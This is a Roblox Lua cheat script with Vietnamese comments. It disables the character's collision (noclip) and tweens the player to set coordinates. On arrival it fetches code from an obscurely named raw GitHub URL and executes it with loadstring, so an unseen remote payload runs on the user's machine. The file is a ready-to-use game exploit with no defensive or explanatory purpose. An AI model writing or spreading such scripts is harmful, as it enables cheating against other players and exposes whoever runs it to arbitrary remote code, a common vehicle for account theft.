local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local rootPart = character:WaitForChild("HumanoidRootPart")

-- Vị trí đích
local targetPosition = Vector3.new(5866.57, 1208.32, 870.75)
local tweenSpeed = 170 -- Tốc độ Tween
local noclipEnabled = true -- Bật Noclip

-- Bật Noclip để xuyên vật thể
local function enableNoclip()
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") and part.CanCollide then
            part.CanCollide = false
        end
    end
end

-- Tắt Noclip sau khi hoàn thành
local function disableNoclip()
    for _, part in pairs(character:GetDescendants()) do
        if part:IsA("BasePart") then
            part.CanCollide = true
        end
    end
end

-- Tween đến vị trí
local function tweenToPosition(targetPosition)
    local distance = (targetPosition - rootPart.Position).Magnitude
    local tweenInfo = TweenInfo.new(distance / tweenSpeed, Enum.EasingStyle.Quad)
    local tween = TweenService:Create(rootPart, tweenInfo, {CFrame = CFrame.new(targetPosition)})

    if noclipEnabled then
        enableNoclip()
    end

    tween:Play()
    tween.Completed:Connect(function()
        if noclipEnabled then
            disableNoclip()
        end

        -- Xác nhận người chơi đã đến vị trí đích
        local distanceToTarget = (rootPart.Position - targetPosition).Magnitude
        if distanceToTarget <= 5 then -- Dung sai 5 studs
            task.wait(2) -- Chờ 2 giây trước khi chạy script
            loadstring(game:HttpGet("https://raw.githubusercontent.com/7j561384269641237894623/15ss-15513o-/refs/heads/main/1532153216"))()
        else
            tweenToPosition(targetPosition) -- Thử lại nếu chưa đến đúng vị trí
        end
    end)
end

-- Khởi chạy Tween
tweenToPosition(targetPosition)
